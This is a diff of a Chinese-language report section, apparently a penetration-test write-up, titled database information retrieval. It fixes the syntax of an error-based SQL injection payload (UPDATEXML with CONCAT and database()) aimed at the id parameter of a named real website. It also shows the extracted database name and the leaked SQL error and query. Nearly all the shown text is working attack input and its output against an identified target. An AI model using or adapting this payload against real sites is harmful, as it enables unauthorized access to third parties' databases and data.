@@ -52,7 +52,7 @@
 ### 3.3 数据库信息获取
 ```sql
 Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10 
-         AND UPDATEXML(1, CONCAT(0x7e, database()), 0x7e), 1) --
+         AND UPDATEXML(1, CONCAT(0x7e, database(), 0x7e), 1) --
 
 结果：成功获取数据库名 qdm177261645_db
 ```
@@ -92,7 +92,7 @@ Payload: http://www.dlhayashi.com/index.php?c=text&a=gywm&id=10
 ```
 SQL 错误消息："XPATH syntax error: 'qdm177261645_db'"
 SQL 语句："SELECT jm_text.* FROM jm_text WHERE 10 AND UPDATEXML(1, 
-         CONCAT(0x7e, database()), 0x7e), 1) -- LIMIT 1"
+         CONCAT(0x7e, database(), 0x7e), 1) -- LIMIT 1"
 SQL 错误代码："7335941"
 ```
 
